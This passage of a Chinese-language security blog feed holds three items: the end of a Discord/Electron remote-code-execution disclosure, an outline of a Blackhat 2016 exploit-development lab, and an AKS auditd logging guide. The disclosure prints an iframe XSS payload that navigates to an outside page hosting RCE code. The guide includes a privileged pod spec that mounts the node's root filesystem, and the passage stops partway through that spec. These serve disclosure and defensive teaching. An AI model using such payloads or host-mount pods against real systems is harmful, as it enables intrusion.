&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;mainWindow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;webContents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;on&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;will-navigate&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;evt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;insideAuthFlow&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;startsWith&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;WEBAPP_ENDPOINT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;evt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;preventDefault&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;测试发现，从iframe发起的顶级导航在某些情况下不会被阻止。进一步研究发现，当iframe与顶级窗口同源时会触发&amp;quot;will-navigate&amp;quot;事件，但跨源时不会触发。我认为这是Electron的bug并报告给了Electron团队。&lt;/p&gt;
&lt;p&gt;利用这个bug，可以通过iframe的XSS导航到包含RCE代码的页面，如top.location=&amp;quot;//l0.cm/discord_calc.html&amp;quot;。&lt;/p&gt;
&lt;h2 id=&#34;漏洞修复&#34;&gt;漏洞修复
&lt;/h2&gt;&lt;p&gt;这些问题通过Discord的漏洞赏金计划报告后：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Discord首先禁用了Sketchfab嵌入&lt;/li&gt;
&lt;li&gt;通过添加sandbox属性到iframe防止导航&lt;/li&gt;
&lt;li&gt;最终启用了contextIsolation&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Sketchfab的XSS通过其漏洞赏金计划快速修复。&amp;ldquo;will-navigate&amp;quot;事件的问题被标记为CVE-2020-15174并修复。&lt;/p&gt;
&lt;h2 id=&#34;总结&#34;&gt;总结
&lt;/h2&gt;&lt;p&gt;这个案例展示了如何组合外部页面漏洞和Electron本身的bug实现RCE。希望本文能帮助开发者更好地保护Electron应用安全。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>漏洞利用实验室：Blackhat 2016漏洞实验课程 - 课前教程与破解挑战</title>
        <link>http://localhost:1313/p/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C%E5%AE%A4blackhat-2016%E6%BC%8F%E6%B4%9E%E5%AE%9E%E9%AA%8C%E8%AF%BE%E7%A8%8B-%E8%AF%BE%E5%89%8D%E6%95%99%E7%A8%8B%E4%B8%8E%E7%A0%B4%E8%A7%A3%E6%8C%91%E6%88%98/</link>
        <pubDate>Sun, 03 Aug 2025 03:03:19 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C%E5%AE%A4blackhat-2016%E6%BC%8F%E6%B4%9E%E5%AE%9E%E9%AA%8C%E8%AF%BE%E7%A8%8B-%E8%AF%BE%E5%89%8D%E6%95%99%E7%A8%8B%E4%B8%8E%E7%A0%B4%E8%A7%A3%E6%8C%91%E6%88%98/</guid>
        <description>&lt;h1 id=&#34;blackhat-2016漏洞实验课程&#34;&gt;Blackhat 2016漏洞实验课程
&lt;/h1&gt;&lt;h2 id=&#34;课前教程模块&#34;&gt;课前教程模块
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;基础缓冲区溢出&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;32位栈溢出原理与实践&lt;/li&gt;
&lt;li&gt;通过恶意输入覆盖EIP寄存器&lt;/li&gt;
&lt;li&gt;使用坏字符检测定位内存冲突&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;现代绕过技术&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DEP/NX保护机制的ROP链构造&lt;/li&gt;
&lt;li&gt;绕过ASLR的内存地址泄露技术&lt;/li&gt;
&lt;li&gt;使用JIT喷射对抗控制流保护&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;crackme挑战集&#34;&gt;Crackme挑战集
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Level1&lt;/strong&gt;&lt;br&gt;
基础栈溢出（无保护机制）&lt;br&gt;
要求：通过覆盖返回地址执行shellcode&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Level2&lt;/strong&gt;&lt;br&gt;
带Canary保护的栈溢出&lt;br&gt;
要求：爆破/泄露栈金丝雀值&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Level3&lt;/strong&gt;&lt;br&gt;
完全防护环境（DEP+ASLR）&lt;br&gt;
要求：组合使用ROP与内存泄露技术&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;实验环境要求：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;VMware Workstation 12+&lt;/li&gt;
&lt;li&gt;Kali Linux虚拟机&lt;/li&gt;
&lt;li&gt;预装GDB-Peda/Pwndbg调试器&lt;/li&gt;
&lt;li&gt;Python Exploit开发套件&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>为AKS VMSS配置主机级审计日志记录</title>
        <link>http://localhost:1313/p/%E4%B8%BAaks-vmss%E9%85%8D%E7%BD%AE%E4%B8%BB%E6%9C%BA%E7%BA%A7%E5%AE%A1%E8%AE%A1%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/</link>
        <pubDate>Sun, 03 Aug 2025 02:52:29 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%B8%BAaks-vmss%E9%85%8D%E7%BD%AE%E4%B8%BB%E6%9C%BA%E7%BA%A7%E5%AE%A1%E8%AE%A1%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/</guid>
        <description>&lt;p&gt;本文指导您如何在Azure Kubernetes Service (AKS)虚拟机规模集(VMSS)上使用Linux审计子系统（也称为auditd）启用和配置Linux审计日志记录。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;警告&lt;/strong&gt;&lt;br&gt;
以下信息截至本文发布日期（2023年3月）是准确的，未来指南可能会有所变化。&lt;/p&gt;
&lt;p&gt;与Kubernetes控制平面日志提供集群高级操作可见性不同，在集群上启用auditd日志记录可以让您查看AKS工作节点和容器内核级别的活动。这包括进程创建、文件访问和命令行活动等，对于发现集群上异常命令行活动和程序执行非常有价值。与容器级日志记录不同，这为您提供了底层工作节点上运行的负载的可见性，而不仅仅是运行在其上的容器化负载（包括容器逃逸和其他漏洞利用）。它具有高度可配置性，对于运行多租户集群尤其有价值。&lt;br&gt;
要了解Linux主机级审计日志记录（和Kubernetes控制平面日志记录）如何为集群提供有用的可见性，请查看我们在&lt;a class=&#34;link&#34; href=&#34;https://example.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Azure Kubernetes Service (AKS)威胁搜寻博客文章&lt;/a&gt;和Jupyter笔记本中提供的威胁搜寻查询。&lt;/p&gt;
&lt;h3 id=&#34;主机级审计日志记录流程&#34;&gt;主机级审计日志记录流程
&lt;/h3&gt;&lt;p&gt;主机级审计日志记录利用多个Linux工具捕获审计日志并将其发送到Log Analytics工作区进行审查。&lt;/p&gt;
&lt;p&gt;实现此目标的组件包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;auditd&lt;/strong&gt;：Linux审计系统的守护进程。守护进程写入磁盘的审计事件由auditd.rules中定义的规则配置。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;audisp&lt;/strong&gt;：审计事件多路复用器，可用于将auditd事件数据分发到syslog等数据收集服务器。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;syslog&lt;/strong&gt;：将日志转发到Linux的Log Analytics代理（OMS）。可以通过Azure门户或管理主机上的配置文件配置syslog转发的事件的设施和严重性。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;auoms&lt;/strong&gt;：Microsoft审计收集工具，可以使用auoms配置中定义的处理规则来收集和过滤auditd/audisp事件数据。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Log Analytics工作区&lt;/strong&gt;：您可以使用Kusto查询语言（KQL）探索来自Azure资源和服务的遥测数据。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;如何在aks-vmss上启用auditd日志记录&#34;&gt;如何在AKS VMSS上启用auditd日志记录
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;警告&lt;/strong&gt;&lt;br&gt;
以下内容指导您完成在AKS集群上设置auditd日志记录的手动步骤。然而，这需要您在集群中的每个工作节点上安装auditd，并且在集群自动扩展后配置将被删除。为避免这种情况，我们建议您使用&lt;a class=&#34;link&#34; href=&#34;https://example.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;aks-auditd&lt;/a&gt;自动在集群上设置此日志记录，或使用自定义脚本扩展。aks-auditd还支持节点重新映像和自动扩展，而手动配置不支持。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;在AKS集群VMSS上启用Linux Operations Management Suite (OMS)代理（auoms）&lt;/strong&gt;，运行以下命令：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;az vmss extension &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --resource-group &lt;span class=&#34;nv&#34;&gt;$RESOURCE_GROUP&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --vmss-name &lt;span class=&#34;nv&#34;&gt;$VMSS_NAME&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --name OmsAgentForLinux &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --publisher Microsoft.EnterpriseCloud.Monitoring &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --protected-settings &lt;span class=&#34;s1&#34;&gt;&amp;#39;{\&amp;#34;workspaceKey\&amp;#34;:\&amp;#34;&amp;lt;KEY&amp;gt;\&amp;#34;}&amp;#39;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --settings &lt;span class=&#34;s1&#34;&gt;&amp;#39;{\&amp;#34;workspaceId\&amp;#34;:\&amp;#34;&amp;lt;ID&amp;gt;&amp;#34;,\&amp;#34;skipDockerProviderInstall\&amp;#34;:true}&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;您的集群的vmss-name将以aks-agentpool开头，并属于以MC_开头的管理资源组，如下面的截图所示。&lt;/p&gt;
&lt;p&gt;workspaceId和workspaceKey可以在Log Analytics工作区内的“代理管理”选项卡中找到，如下面的截图所示。workspaceKey对应于下面突出显示的“主键”。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;通过Azure门户触发VM更新&lt;/strong&gt;（选择每个实例并选择升级）。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;在VMSS工作节点上安装auditd&lt;/strong&gt;。为此，您需要部署或获取一个在集群上运行的特权Pod，该Pod可以访问底层工作节点的文件系统和进程ID命名空间。您可以通过以下方式实现：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;部署一个Pod&lt;/strong&gt;，其规范将hostPath卷挂载到容器环境中。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;在Pod规范中包含securityContext字段&lt;/strong&gt;并启用特权模式。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;配置主机进程ID命名空间共享&lt;/strong&gt;，通过在Pod规范中包含hostPID字段并启用它。&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;apiVersion&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;v1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;kind&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;Pod&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;metadata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;privileged-pod&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;spec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;hostPID&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;containers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;priv-host-mount&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;image&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;alpine:latest&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;/bin/sh&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;- -&lt;span class=&#34;l&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;- -&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;while true; do sleep 30; done;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;securityContext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;privileged&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;volumeMounts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;privmount&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;          &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;mountPath&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;/workernode&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;volumes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;privmount&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;hostPath&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;Directory&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
